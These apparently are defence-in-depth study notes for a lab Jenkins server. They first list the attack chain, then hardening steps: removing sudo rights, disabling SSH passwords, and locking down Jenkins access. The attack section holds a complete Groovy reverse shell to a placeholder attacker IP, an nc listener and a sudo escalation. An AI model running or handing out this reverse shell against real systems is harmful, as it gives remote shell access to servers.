## The Problem
### Jenkins
Open-source automation server
### Reverse shell
Everyone has access to run arbitrary code
```Groovy revshell
String host="attacking machine IP here"; 
int port=6996; 
String cmd="/bin/bash"; 
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
On attacker:
`nc -lnvp 6996`
### Peculiar file
Has Tracy's ssh login details
### PrivEsc
Tracy can use sudo with ALL
`sudo su`

## The Solution
## [[PoLP|Principle of Least Privilege]]
#### [[12-Defense in Depth#PrivEsc|Remove Tracy from sudo group]]
That change alone made all the difference between achieving root and staying with the user tracy. Now the attacker is left with three immediate options:

- Further enumerate the server for a possible route to root within the user tracy,
- Find a way to move laterally within the system to a user with a possible route to root access, or
- Find a different target.

## Hardening of SSH
#### [[12-Defense in Depth#Peculiar file|Remove password-based SSH]]
1. Modify /etc/ssh/sshd_config
	- `PasswordAuthentication no`
	- `#Include ...`
2. `sudo systemctl restart ssh`

## Stronger password policies
#### Problems in ssh password:
1. The password is weak and may be susceptible to a brute force attack, and
2. The user employed bad password practices, putting [[12-Defense in Depth#Peculiar file|plaintext credentials on a script]] and leaving it lying around for anyone with server access to see

## Promoting Zero Trust
#### [[12-Defense in Depth#Reverse shell|The problem]]
Everyone in environment can access the workings of the platform through Jenkins

Solution:
``` bash
egrep 'denyAnonymousReadAccess|disableSignup|enableCaptcha' -C1 /var/lib/jenkins/config.xml 
<authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">
	<denyAnonymousReadAccess>true</denyAnonymousReadAccess> 
</authorizationStrategy> 
<securityRealm class="hudson.security.HudsonPrivateSecurityRealm"> 
	<disableSignup>true</disableSignup> 
	<enableCaptcha>false</enableCaptcha> 
</securityRealm>
```

